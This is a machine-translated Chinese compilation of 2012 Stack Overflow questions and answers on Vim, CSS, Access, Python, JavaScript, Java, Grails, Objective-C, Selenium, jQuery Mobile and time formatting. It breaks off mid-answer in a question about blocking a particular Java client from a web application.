好久没做树搜索了，但是有一些逻辑比如
横树。树将具有小于树左侧的所有值和大于树右侧的值。这是伪代码。您可能想查找用于遍历树的算法。

```
while rt!=null
if name ==rt-> name return rt
else if name < rt->name then rt=rt->left //otherwise name is greater so on right side     

else rt=rt->right
end while 
```

找不到名字

# vim - 以插入模式从系统剪贴板粘贴然后重复 (.) 失败

> ID：11751647
> 
> 赞同：5
> 
> 时间：2012-08-01T02:02:52.463
> 
> 标签：vim, clipboard, paste

我在 MacVim 中，但我猜这也适用于 gVim。在插入模式下，如果我从系统剪贴板粘贴`⌘</kbd>-`v` then get out `Esc` then repeat `.` all it does is move the cursor back a space. It's not registering the system paste as part of the keystrokes I typed.`

奇怪的是，如果我输入`⌘</kbd>-`v` in normal mode, I can hit `.` after to repeat it and it works fine.`

我知道我可以打字`<c-r>*`，但那很**糟糕**。

我试过`inoremap <D-v> <c-r>*`了，但似乎没有效果。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T20:06:32.987

试着把它放在你的 ~/.gvimrc 中：

```
inoremenu Edit.Paste <C-r><C-p>* 
```

# css - 悬停时的css图像替换

> ID：11751648
> 
> 赞同：0
> 
> 时间：2012-08-01T02:03:01.313
> 
> 标签：css, hover

我的 html 页面上有 2 个图像：悬停时 image2 将替换 image1。这没问题，但棘手的部分是 image1 自己形成一个链接，并且无论图像的实际尺寸如何，两个图像都应始终以指定的长度和宽度显示。

现在我可以管理悬停部分、指定的设置尺寸、image1 的链接（href），但两个图像都将部分显示而不是显示完整的图像，而只是调整到指定的尺寸。

有人可以帮忙吗？

我的html：

```
<table width="100" border="0" cellspacing="0" cellpadding="0">
 <tr>
   <td>
     <a href="@Url.Action("TestMethod", "Deal")" ><alt="" class="links" title="plaat1"/></a>
   </td>
 </tr>
</table> 
```

我的.css：

```
.links { display:block;
        background:url(../../Content/image1.jpg) center top no-repeat;
        height:124px;
        width:186px;
       }

.links:hover { background:url(../../Content/image2.jpg) center top no-repeat;
             } 
```

有人可以帮忙吗？非常感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T07:13:58.683

`IMG`如果要显示所有图像而不被裁剪（即：调整大小），则必须使用标签。您可以借助脚本来设置和恢复悬停时的图像。将`IMG`标签的`SRC`属性用于普通图像，将自定义`HOVER`属性用于悬停图像。

```
<html>
  <head>
    <style>
      .links>img { height:124px; width:186px; }
    </style>
    <script>
      onload = function() {
        var a = document.getElementsByClassName('links');
        for (var b = 0; b < a.length; b++) {
          var c = a[b].firstElementChild;
          c.setAttribute('img', c.src);
          c.addEventListener('mouseenter', function(ev) {
            ev.target.src = ev.target.attributes['hover'].value;
          }, false);
          c.addEventListener('mouseout', function(ev) {
            ev.target.src = ev.target.attributes['img'].value;
          }, false);
        }
      }
    </script>
  </head>
  <body>
    <table width="100" border="0" cellspacing="0" cellpadding="0">
      <tr>
        <td>
          <a href="@Url.Action("TestMethod", "Deal")" class="links" title="plaat1" /><img src="../../Content/image1.jpg" hover="../../Content/image2.jpg" /></a>
        </td>
        <td>
          <a href="@Url.Action("logoff", "Logout")" class="links" title="Log Out" /><img src="../../Content/image2.jpg" hover="../../Content/image3.jpg" /></a>
        </td>
      </tr>
    </table>  
  </body>
</html> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T04:23:35.123

嘿现在习惯了这个html代码

```
<table width="100" border="0" cellspacing="0" cellpadding="0">
 <tr>
   <td>
     <a href="@Url.Action("TestMethod", "Deal")" class="links" ><alt=""  title="plaat1"/></a>
   </td>
 </tr>
</table> 
```

# ms-access - 如何用图像替换 Access 2007 报表中的值？

> ID：11751649
> 
> 赞同：0
> 
> 时间：2012-08-01T02:03:16.800
> 
> 标签：ms-access, vba, ms-access-2007

我报告的表格中有一个颜色字段。我打算用一个基于单词的小方块颜色替换报告上的这个文本。

几天来，我一直在 Access 中进行挖掘，但似乎无法在 VBA 或“属性”窗格中找到任何选项。

更新：感谢汤姆为我指明了正确的方向，到目前为止，我已经完成了这种工作，决定使用文本框而不是矩形，因为这样我仍然可以在里面放置彩色文本。因此，我使用 Report_Current 事件编写了一个巨大的“Select Case Report_rptSRSearch.Colour”来处理这个问题。

然而，使用 Report_Current 事件似乎并没有提供确切所需的功能。它将完全按照我的意愿执行，除非用户实际单击报告上的记录。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T04:46:27.153

Not testing this, so my syntax may be off slightly.

Create your square on your form. In this example we'll call it square1. On the Form_Current event (VBA), check the value of the colour field, and using a Select Case statement, set the background colour of square1.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-06T05:40:51.823

所以终于想通了，你必须使用 Detail_Paint 方法。呃;)

# python - 字符串不断重复，直到 randint 提供正确的答案。

> ID：11751652
> 
> 赞同：1
> 
> 时间：2012-08-01T02:04:18.507
> 
> 标签：python

我正在尝试创建这个简单的游戏，但遇到了麻烦。这是代码，它不断循环不同的答案。请原谅这个可怕的故事，有人可以帮忙吗？

如果选项等于正确（答案），代码应该很快。但事实并非如此，它只是不断循环这两个选项，直到找到正确的选项。

```
import random

def options():
    print()
    print("What do you do?")
    print("1\. Check the local bakery to see if the criminal is hiding in the oven.")
    print("2\. Search the forest to see if he's made a quick getaway.")
    print("3\. Check with the innkeeper to see if anyone has come in recently.")
    print("4\. Search the sewers, this criminal scum will do anything for money.")
    print("9\. Quit.")

print("On a dark and rainy night the town of Ogalu was quietly sleeping. On this night, a criminal \nwas amidst the sleeping people he sought to steal the King's crown and make himself rich."
        "The criminal named Zalox snuck into the palace, and stole the crown without alerting the guards. \nAfter this he ran away, but you, Bob the guard, heard something. You went to check the king"
        "he was safe, you then went to check the crown. They were gone!, you alert the townsguard and set \nout to catch this criminal scum.")
correct = random.randint(1,4)
options()
option = int(input("What option: "))
while option != 9:
    if option == 1:
        if correct == option:
            print("You make your way into the local bakery, you hear something drop. You turn around and there he is, the theif, in the local oven. You arrest him and put him in jail!")
        else:
            print("As you search the bakery you think you hear something near the oven, as you check it out you realise it's just a mouse. The theif isn't here!")

    elif option == 2:
        if correct == 2:
            print("As you make your way towards the forest you see a shadow limping away, it's the theif! You chase after him and catch him, you send him to jail for life!")
            break
        else:
            print("You head towards the forest, you think you hear something moving in the bushes, as you check it out a giant wolf chases you out of the forest, the theif isn't here")
    elif option == 3:
        if correct == 3:
            print("You approach the innkeeper and ask if anyone suspicious has been staying there, the innkeeper says a man came in recently in a hurry, he's in his room. You dart upstairs, burst into his room"
                    "and arrest him!")
            break
        else:
            print("You see the innkeeper walking his dog, you ask if anyone suspicious has been stayig with him, he says no. The theif isn't here")

    elif option == 4:
        if correct == 4:
            print("You search the old, dirty, smelly sewers looking for the thief, in the distance you see a light and a person running. It's the thief! You take a shortcut and pounce on him! You put him to jail!")
            break
        else:
            print("As you search the sewers you see nothing but smelly, dirty, sewage. Maybe the theif won't do anything for money. This was a bad idea, you make your way out the next exit")

print("Congratulatious! You saved the King's crown by capturing the theif know as Zalox. He's sentanced to life in jail. The town can finally relax again! You are know as Hero of Ogalu!") 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T02:07:30.923

您使循环以对`option`' 值的更改为条件，但仅在循环之外分配给该名称：

```
option = int(input("What option: "))
while option != 9: 
```

而是将其移动到`while`循环内（还要确保`option`' 的初始分配满足`while`循环的条件！）。

此外，不请自来的建议：一旦你利用了`dict`ionary 的力量，你就会被震撼。这只是很棒的东西。将这些选择映射到要调用的字符串或对象或函数，它可能更清晰和/或更可扩展。

# javascript - 将自定义功能应用于单击事件时，防止“劫持”链接单击的意图

> ID：11751656
> 
> 赞同：7
> 
> 时间：2012-08-01T02:05:05.883
> 
> 标签：javascript, usability

例如，有一些 JavaScript 代码有一个点击处理程序，它决定了用户应该被重定向到哪里。假设它只是一个重定向随机链接，当用户点击链接时计算出来。

以下是一些场景：

*   如果用户左键单击链接，则用户的目的是将导航保持在同一选项卡中，这适用于`window.location`.

*   如果用户中间点击了这个链接，对用户来说，网站似乎劫持了中间点击并简单地忽略了它，将用户重定向到同一选项卡而不是新选项卡。

*   此外，正如有人刚刚评论（并删除了评论？），另一种情况是修改键也可以建议浏览器打开一个新选项卡，甚至是一个新窗口。

*   另一个建议是能够通过上下文菜单在新选项卡或窗口中打开链接。这不太重要，但绝对是相同的可用性问题。

我在很多网站上都看到过这个问题，特别是对我来说，谷歌分析，几乎每次我中间点击时，都会发生这种效果。

一些 JavaScript 代码需要的一个很好的例子是：

> 处理一些数据，然后发送一个 XHR 请求，该请求需要在允许用户继续访问他们单击的链接之前完成。

你如何解决这个问题？例如，有没有办法检测用户是否期望链接出现在新标签中，如果是，是否可以加载新标签？也许我在想这个错误的方式？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T02:15:19.833

`event.button`可用于识别单击了哪个鼠标按钮。中间按钮返回 1。

该对象还`event`包含属性`event.ctrlKey`，它们是不言自明的。它们的值是是否按下了相应的键，否则。`event.altKey``event.shiftKey``true``false`

* * *

您希望实现的行为：http: [//jsfiddle.net/pratik136/nCdhv/9/](http://jsfiddle.net/pratik136/nCdhv/9/)

html:

```
<a id="smart" href="http://www.bbc.co.uk/">Click</a>​ 
```

js：

```
$(function() {
    $('#smart').on('click', function(event) {
        if (event && event.button && event.button === 1) {
            event.preventDefault();
            window.open($('#smart').attr('href'), '_blank');
            return false;
        } else {
            return true;
        }
    });
});​ 
```

* * *

src：[https](https://developer.mozilla.org/En/DOM/Event.button)
://developer.mozilla.org/En/DOM/Event.button 浏览器支持：[http ://help.dottoro.com/ljaxplfi.php](http://help.dottoro.com/ljaxplfi.php)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T07:36:52.083

这并不能完全回答问题，而是潜在的问题。我的一个伙伴意识到`$.ajax`有一个`async: false`选择。

```
$(function() {
    $('a').click(function(e) {
        $.ajax({url: '/', async: false}).done(function(d) { alert('hello ' + d) })
    })
})​ 
```

小提琴：http: [//jsfiddle.net/gakman/7qdXE/](http://jsfiddle.net/gakman/7qdXE/)

这将阻止`href=""`单击事件，直到 ajax 响应返回，并继续链接指向的任何选项卡/窗口。

他还说“这是有史以来最糟糕的事情”，这是绝对正确的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-01T03:20:23.533

要在浏览器中获得一致的行为，请在用户单击链接*之前*将链接的 href 属性设置为适当的值。然后由用户决定是否应该在同一个窗口、新窗口或选项卡中打开链接。

例如

```
<a href="http://www.apple.com" onclick="this.href='http://www.google.com'">Apple</a> 
```

在 IE 9 和 Firefox 中，左键单击打开 Google，ctrl + 左键单击将在新选项卡中打开 Apple，右键单击并选择“在新选项卡中打开链接”也是如此。解决此问题的唯一方法是在用户单击链接之前设置 href。

链接上的中间或右键单击可能不会调度单击事件。

如果链接已经被点击，并且使用返回按钮返回页面，则链接的href可能是原始的，也可能是脚本修改的。

底线是让链接表现得像链接。如果需要一些其他行为，请使用按钮或不同的 UI 对象。

# indexing - urllib2：索引几个关键字

> ID：11751660
> 
> 赞同：0
> 
> 时间：2012-08-01T02:05:48.067
> 
> 标签：indexing, python-2.7, urllib2

我已经四处寻找了一段时间，但似乎找不到有关使用 urllib2 中的 index 命令的指南。基本上，该函数找到第一个单词，它是/或包含给定索引函数的字符，然后返回它的位置。

```
page_content= urllib2.urlopen(URL).read() #Gets the website
i1 = page_content.index(keyword) #finds keyword in the website 
```

从这里开始，i1 可以用于 urllib2 中的不同内容，但这与此无关。

我的问题是 .index 没有得到与关键字匹配的所有单词，而只有第一个。如果您知道网站上只有一种，那没问题，但我希望将它们全部分配到一个列表中，然后我可以从中获取并使用它们的位置。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T02:25:17.110

用户功能

```
import re 
page_content= urllib2.urlopen(URL).read() #Gets the website
idall = [m.start() for m in re.finditer(keyword,page_content)]

print idall 
```

# java - Java中的任何颜色操作库？

> ID：11751663
> 
> 赞同：0
> 
> 时间：2012-08-01T02:06:28.177
> 
> 标签：java, javascript, colors, gradient

在 JavaScript 中，我使用了 JQuery 插件[xcolor](http://www.xarg.org/project/jquery-color-plugin-xcolor/)，这是一个很棒的处理颜色的小工具。它具有颜色字符串解析器、所有颜色空间转换方法、一些颜色过滤器和我最喜欢的渐变生成器（请参阅 参考资料`$.xcolor.gradientlevel()`）。

我在 Java 中寻找类似的东西。其他好处是假色例程（将数字转换为颜色 - 强大的例程将具有最大/最小截止值和对数与线性比例等参数）和配色方案（如红色 -> 橙色 -> 黄色 -> 绿色渐变生成器） .

是否有任何免费库可以在 Java 中完成其中一些事情，或者这是我必须自己动手做的事情？除了 AWT 中的一些东西外，我在谷歌搜索中没有找到太多东西，但我需要它是通用的，因为我根本没有使用任何 Java GUI 东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T02:30:34.407

Java's [Color class](http://docs.oracle.com/javase/6/docs/api/java/awt/Color.html) should work fine:

```
Color.brighter()
Color.darker() 
```

Gradients:

[http://docs.oracle.com/javase/6/docs/api/java/awt/GradientPaint.html](http://docs.oracle.com/javase/6/docs/api/java/awt/GradientPaint.html)

[Generating gradients programmatically?](https://stackoverflow.com/questions/27532/generating-gradients-programatically)

Hue Saturation: `Color.getHSBColor(hue, saturation, brightness)`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-01-12T12:39:35.233

我没有尝试过使用它。但我遇到了 apache commons 成像库，它看起来很有趣

[http://commons.apache.org/proper/commons-imaging/](http://commons.apache.org/proper/commons-imaging/)

# grails - 部署 Grails Web 应用程序的最低要求

> ID：11751664
> 
> 赞同：1
> 
> 时间：2012-08-01T02:06:53.083
> 
> 标签：grails

我打算将 grails Web 应用程序部署到另一台计算机上。另一台计算机已经有一个 apache tomcat 服务器和一个 mysql 服务器。

我是否需要在要部署 grails 应用程序的那台机器上安装 groovy？或其他图书馆？还是只是java？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T02:33:21.080

All you need is java and a webapp container like tomcat. When you create a war file with `grails war`, the war file will contain all the dependencies of your project, including all of grails and groovy. This does make the war files quite large, but they are extremely easy to deploy.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T06:59:27.170

事实上，您只需要一个 web 容器（一些 web 容器中内置了 JRE）

您通过运行“grails war”创建的war 文件将构建一个包含所有库的war 文件，其中包括其中的所有库。

# objective-c - 在另一个类中隐藏/显示视图

> ID：11751667
> 
> 赞同：0
> 
> 时间：2012-08-01T02:07:07.437
> 
> 标签：objective-c, ios

我有以下情况： ![在此处输入图像描述](../Images/300335124c8d2ccb4810947b2dba97b9.png)

是在`SecondViewController`里面`FirstViewController`。现在，我想向 中添加另一个子类`FirstViewController`，但要从`secondViewController`该类中添加，如图所示：![在此处输入图像描述](../Images/ad525d478f75277afffe8cb2531c72ad.png)

我一直在寻找，我认为这是不可能的。我已经尝试实例化 FirstViewController，访问“视图到子视图”并添加为子视图，但这不起作用：

```
FirstViewController *viewController = [[FirstViewController alloc] init];
[self.view addSubview:[viewController viewToAddAsSubView]]; 
```

任何提示/解决方案？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T02:37:10.703

这实际上可以使用 NSNotificationCenter。下面的例子：

```
[[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(METHOD:) name:@"LISTEN_TO_VIEW_2" object:nil]; 
```

上面的代码应该放在视图 1 中，以便“监听”视图 2 向它发送一个通知，通知您应该执行视图 1 中的方法以在视图 1 中添加/编辑您想要的任何内容。

```
[[NSNotificationCenter defaultCenter] postNotificationName:@"LISTEN_TO_VIEW_2" object:nil]; 
```

上面的代码会将通知发送到视图 1。然后在视图 1 中，您将有一个类似这样的方法：

```
-(void)METHOD:(id)sender {
//do something here
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T03:42:38.563

一种可能的方法是使用 SecondViewController 的视图的 superView。这是一种非常直接的方式。

```
[[self.view superview] insertSubview:theView aboveSubview:self.view]; 
```

另一种方法是使用委托。您可以在 SecondViewController 中声明一个委托，例如

```
@protocol SecondViewControllerDelegate : NSObject
{
    - (void)requestInsertView:(UIView*)view aboveView:(UIView*)baseView;
}

@interface SecondViewController <...>

@property (nonatomic, assign) id<SecondViewControllerDelegate>superViewDelegate;
@end; 
```

并修改FirstViewController的声明实现SecondViewControllerDelegate

```
@interface FirstViewController <SecondViewControllerDelegate, ...> 

@implement FirstViewController

- (void)requestInsertView:(UIView*)view aboveView:(UIView*)baseView
{
    [self.view insertView:view aboveSubview:baseView];
}
@end; 
```

创建 SecondViewController 后，将其 superViewDelegate 设置为 FirstViewController 的实例。

在您需要从 SecondViewController 添加视图的地方，您可以调用

```
[self.superViewDelegate requestInsertView:view aboveView:self.view]; 
```

# objective-c - Instagram 如何将 UIKeyboard returnKey 自定义为“@”和“#”？

> ID：11751673
> 
> 赞同：11
> 
> 时间：2012-08-01T02:07:39.060
> 
> 标签：objective-c, ios, uikeyboard, instagram

Instagram iOS 应用程序的最新版本做了一些有趣的事情。在文本字段中书写时（例如，发表评论），UIKeyboard 的返回键已被两个键替换：一个`@`键和一个`#`键。这是一个屏幕截图：

![Instagram 键盘截图](../Images/d8bde3cdca550ea4451eaadfa4d00c28.png)

我想知道他们是如何做到这一点的。据我所知，`@`键`#`的行为与普通键一样：它们在通常没有 returnKey 的键盘中消失（例如表情符号键盘）等。

到目前为止，我唯一想到的是该应用程序正在获取对的引用`UIKeyboard`并循环遍历子视图，找到并隐藏`returnKey`，然后找到并移动`@`and`#`键。还有其他想法吗？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-08-01T02:16:44.333

这似乎是一个[`keyboardType`](https://developer.apple.com/library/ios/documentation/UIKit/Reference/UITextInputTraits_Protocol/Reference/UITextInputTraits.html#//apple_ref/occ/intfp/UITextInputTraits/keyboardType)设置为的文本字段`UIKeyboardTypeTwitter`，最初是在 iOS 5 中引入的。它与 iOS 5 中的 Tweet Sheets 使用的键盘布局完全相同，返回键分别被替换为`@`和`#`键。

由于 Instagram 碰巧`@`用于引用用户和`#`标记帖子，就像 Twitter 一样，我猜他们正在借用`UIKeyboardTypeTwitter`他们自己的应用程序以方便使用。

# selenium - 硒模式匹配

> ID：11751674
> 
> 赞同：1
> 
> 时间：2012-08-01T02:07:50.120
> 
> 标签：selenium

在 Selenium 中需要一些模式匹配方面的帮助。我正在尝试阅读以下内部 div 标签，

```
<div>
     <div class="xyz one"></div>

     <div class="xyz two"></div>

     <div class="xyz three"></div>
</div> 
```

有没有办法我可以做到这一点？任何建议将不胜感激。

干杯

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T22:34:15.437

这是一个 XPath，您可以使用它来选择包含文本“xyz”的所有 div 标记。

```
"//div[contains(@class, 'xyz')]" 
```

因此，为了使用它，您将使用这一行，它会创建一个包含文本“xyz”的所有 div 的集合

```
var divElements = driver.FindElements(By.XPath("//div[contains(@class, 'xyz')]")); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-01T09:24:36.267

```
IWebDriver driver = new FirefoxDriver();
driver.FindElement(By.CssSelector("div.xyz")); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-01T04:02:22.103

看起来您的问题已经得到解答 [Get HTML Source of WebElement in Selenium WebDriver using Python](https://stackoverflow.com/questions/7263824/get-html-source-of-webelement-in-selenium-webdriver-python) 然后您可以解析您的输出。

*编辑*

为了让事情变得更简单：（使用 Python）

尝试：

```
class_list = [] 
my_divs = driver.find_elements_by_css_selector(div[class*=xyz])
for div in my_divs:
   outerHTML = div.get_attribute("outerHTML")
   classpos = outerHTML.find('class=') #find where our class identifier begins
   quote_begin = outerHTML.find('"',classpos) 
   quote_end = outerHTML.find('"', quote_begin+1)
   our_class = outerHTML[classpos:quote_end+1] #get the entire class identifier
   class_list.append(our_class)
   print our_class 
```

我敢肯定，有人用一行代码做的事情和我的 4 行代码一样，但这是我能想到的。此外，此代码可以很快更改为 Java

# java - 字符串数组不显示在 JOptionPane 中

> ID：11751675
> 
> 赞同：0
> 
> 时间：2012-08-01T02:07:50.847
> 
> 标签：java, arrays, swing, joptionpane

这些类在编译时的最终工作要求输入，并且应该在对话框中显示一个字符串数组。

一级

```
public class Card {

    private int rank;
    private int suit;
    private String rankName;
    private String suitName;
    private String cardName;

    public Card () {
        rank = 0;
        suit = 0;
        rankName = "";
        suitName = "";
        cardName = "";
    }

    public int getRank() {
        return rank;
    }   
    public void setRank(int rank) {
        this.rank = rank;
    }
    public int getSuit() {
        return suit;
    }
    public void setSuit(int suit) {
        this.suit = suit;
    }
    public String getRankName() {
        return rankName;
    }
    public void setRankName(String rankName) {
        this.rankName = rankName;
    }
    public String getSuitName() {
        return suitName;
    }
    public void setSuitName(String suitName) {
        this.suitName = suitName;
    }
    public String getCardName() {
        return cardName;
    }
    public void setCardName(String cardName) {
        this.cardName = cardName;
    }

    public String toString() {
        return cardName;
    }

} 
```

2 级。我感谢垃圾神。但是，问题出在哪里。它不会在对话框中显示字符串数组。它什么也不显示。

```
import java.util.*;

import javax.swing.JList;
import javax.swing.JOptionPane;
import javax.swing.JScrollPane;

public class Deck {

    public List<Card> cards = new ArrayList<Card>();

    public void assignIntegerValues(Card card) {
        String[] suitNameArray = {"Clubs", "Spades", "Hearts", "Diamonds"};
        String[] rankNameArray = {"Ace", "Two", "Three", "Four", "Five", "Six", "Seven", "Eight", "Nine", "Ten", "Jack", "Queen", "King"};

        card.setSuitName  (suitNameArray[card.getSuit()-1]);
        card.setRankName (rankNameArray[card.getRank()-1]);
        card.setCardName (card.getSuitName() + "-" + card.getRankName());
        JOptionPane.showMessageDialog(null, card.getCardName());
        Card card1 = new Card(); 
        cards.add(card1);
    }

    public void displayAll() {
        JOptionPane.showMessageDialog(null, new JScrollPane(new JList(cards.toArray())));
    }

} 
```

第三类

```
import java.util.ArrayList;
import java.util.List;

import javax.swing.JOptionPane;

public class DisplayDeck {

    public static List<Card> cards = new ArrayList<Card>();

    public static void main(String[] args) {

        Card card = new Card();
        Deck deck = new Deck();
        int answer;
        String again;
        String[] nameOfCards;

        do {
            String suitString = JOptionPane.showInputDialog("Suit: ");
            card.setSuit (Integer.parseInt(suitString));

            String rankString = JOptionPane.showInputDialog("Rank: ");
            card.setRank (Integer.parseInt(rankString)); 

            deck.assignIntegerValues(card);
            String answerString = JOptionPane.showInputDialog("Try again? (1/0) ");
            answer = Integer.parseInt(answerString);

        } while (answer == 1);

        deck.displayAll();

    }
} 
```

非常感谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T02:23:56.067

该问题与未显示的数组（或更好的 ArrayList）无关。问题是 List 一开始就没有有用的信息，因此实际上没有什么可显示的。

代码只是在做你写的事情。你不会在你的牌组中添加任何包含任何有意义信息的牌。查看您在甲板上添加任何内容的位置`List<Card>`：

```
Card card1 = new Card(); 
cards.add(card1); 
```

您每次都添加一个默认 Card 对象，但没有添加任何有意义的信息。所有有意义的信息都被丢弃了。由于这是家庭作业，我会要求您重新考虑如何更好地做到这一点。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T02:55:14.663

您的代码的问题是存储信息（**名称）的****卡**尚未使用并被**丢弃**，并且作为**新卡**（*没有数据*）您正在创建并传递给*******`list`*******

 *******```
card.setCardName (card.getSuitName() + "-" + card.getRankName()); //hold data
Card card1 = new Card();  // holds nothing (useless)
cards.add(card1); // will have card with no data

public void displayAll() {
   JOptionPane.showMessageDialog(null, new JScrollPane(new JList(cards.toArray())));
    // has nothing to display
} 
```*******

# javascript - 过渡期间的 jQuery Mobile 多页设置页面

> ID：11751688
> 
> 赞同：0
> 
> 时间：2012-08-01T02:10:55.027
> 
> 标签：javascript, jquery-mobile, multipage

我正在构建一个基于 jQuery mobile 的应用程序，并使用[此处描述的多页模板功能](http://jquerymobile.com/demos/1.1.1/docs/pages/multipage-template.html)。那就是我有几个带有 data-role="page" 的 div。

问题是我需要加载一些 JSON 并根据第一页上的选择构建第二个“页面”。如何插入一些代码以在页面转换期间运行（即在微调器启动时）。请注意，用户可以再次返回第一页并做出不同的选择 - 所以我需要运行代码以再次构建“页面”2。

这有意义吗？我发现文档真的很难遵循 - 但也许我错过了一些非常明显的东西。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T03:17:33.720

您可以使用 jQuery Mobile 提供的“pagebeforeshow”事件[http://jquerymobile.com/test/docs/api/events.html](http://jquerymobile.com/test/docs/api/events.html)

根据文档，事件的工作方式如下：“在实际过渡动画开始之前，在我们过渡到的“toPage”上触发。

像这样的东西：

```
$(document).on("pagebeforeshow", "#myPageId", function() {
    //Stuff here
}); 
```

# python - 具有多个误差线的 Python 线性拟合

> ID：11751689
> 
> 赞同：6
> 
> 时间：2012-08-01T02:10:55.327
> 
> 标签：python, statistics, matplotlib, curve-fitting, linear-regression

我正在用线性拟合拟合一些数据。我想加权误差条。到目前为止，我一直在使用牛头犬[fit.py](http://bulldog2.redlands.edu/facultyfolder/deweerd/tutorials/fitting.txt)。它们`linear_fit`使加权线性回归非常容易。不幸的是，我正在使用的数据在 X 和 Y 方向都有错误。

我想知道实际上（在 Python 中）和理论上（在统计方面）如何做到这一点。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-02T20:30:09.417

有几个选择：

1.  [`scipy.optimize.leastsq`](http://docs.scipy.org/doc/scipy-0.7.x/reference/generated/scipy.optimize.leastsq.html)（对于[总最小二乘](http://en.wikipedia.org/wiki/Total_least_squares)）
2.  [`scipy.odr`](http://docs.scipy.org/doc/scipy/reference/generated/scipy.odr.ODR.html#scipy.odr.ODR)（对于[戴明回归](http://en.wikipedia.org/wiki/Deming_regression)）。

*这两种解决方案都将解释 X 和 Y 方向的独立误差（odr 中的 scld 数组）。*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-02T14:21:48.347

您可以使用该[`scipy.optimize.fmin()`](http://docs.scipy.org/doc/scipy/reference/generated/scipy.optimize.fmin.html#scipy.optimize.fmin)函数（[参见此示例](http://docs.scipy.org/doc/scipy-0.10.0/reference/tutorial/optimize.html)）来最小化计算 x 和 y 方向上的平方偏差的评价函数（您必须定义它）。

# jquery - jquery转换时间格式

> ID：11751691
> 
> 赞同：1
> 
> 时间：2012-08-01T02:11:09.800
> 
> 标签：jquery, regex

我有文本输入来输入时间，有时当我双击输入时我需要将时间从 12 小时格式更改为 24 格式.. 所以我怎样才能像这样转换时间：

1:00 => 13:00

01:00 => 13:00

（提示）我的代码：

```
 $("input").live('dblclick', function(){
    var type12 = $(this).val();
    if (type12.length == 4){
    var time = type12.replace(/\:/, '');
    var hh = time.substr(0,1);
    var mm = time.substr(0,3); // TO DO
    var type24 = Number(hh) + 12;
    var time24 = hh + mm;
    $(this).val(time24);
    sortTimes($(this).closest("tr"));
    }else{alert('not');}
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T02:37:18.160

这是答案

```
 $("input").live('dblclick', function(){
    var type12 = $(this).val();
    if (type12.length == 4){
        var time = type12.replace(/\:/, '');
        var hh = time.substr(0,1);
        var mm = time.substr(1,2);
        var hh = Number(hh) + 12;
        var time24 = hh + ':' + mm;
        $(this).val(time24);
    }else if(type12.length == 5 && type12.substr(0,1) == 0) {
        var time = type12.replace(/\:/, '');
        var hh = time.substr(0,2);
        var mm = time.substr(2,2);
        var hh = Number(hh) + 12;
        var time24 = hh + ':' + mm;
        $(this).val(time24);
    }
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T03:28:52.030

根据我的评论，这就是我要做的。首先，您应该真正为您的 12 小时时间定义一个一致的字符串。我会使用格式`hh:mm am / hh:mm pm`。

其次，我会放弃这`.live()`两个原因，首先，因为从 jQuery 1.7 开始，它已被折旧并替换为`.on()`，其次是因为您需要具有将 24 小时时间转换回 12 小时时间按钮的功能第二次被双击。如果您使用单击，我们可以使用`.toggle()`，但是对于双击，我们将需要使用插件，我建议使用[jQuery-Function-Toggle-Plugin](https://github.com/fkling/jQuery-Function-Toggle-Plugin)。一旦包含在您的代码中，它就可以像这样使用：

```
$('input').funcToggle('dblclick', function() {
    //Odd Click
}, function() {
    // Even Click
}); 
```

接下来，我们可以使用`.indexOf(":")`, 来检查字符串中是否包含 a ，而不是使用子字符串，这虽然非常好，但`:`然后 .split(":") 将字符串拆分为数组。我是这样做的：

```
var type12 = "12:45";
if (type12.indexOf(":") != -1) {
    time_array = type12.split(":");
    hh = time_array[0];  //12
    mm = time_array[1];  //45
} 
```

完整的代码和示例可以在这里找到 --> [http://jsfiddle.net/374xN/4/](http://jsfiddle.net/374xN/4/)

对于您的要求，这可能有点矫枉过正，但希望它能为您指明正确的方向。

# java - 如何阻止特定客户端访问 Web 应用程序？

> ID：11751692
> 
> 赞同：0
> 
> 时间：2012-08-01T02:11:21.800
> 
> 标签：java, cookies, security, access-control

有一个 Java 应用程序请求一个页面，我希望阻止它。

我认为这样做的一种方法是使用会话或 cookie，但我不确定 Java URL 方法是否可以处理它们。

除了使用会话或 cookie 之外，还有其他方法可以区分来自这个 Java 应用程序的请求并阻止它吗？我知道它有一个独特的 Java 用户代理标头，但我希望更准确。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T03:09:25.950

标题问题的答案是这些`URL.openXxx`方法不理解 cookie。

（如果您的服务器配置为在请求 URL 本身中接受会话令牌，则这些`URL.openXxx`方法不会妨碍您。但是，这种方法是不安全的。）

然后我们来到你的问题的主体。

> ...除了使用会话或 cookie 之外，还有其他方法可以区分来自这个 java 应用程序的请求并阻止它吗？

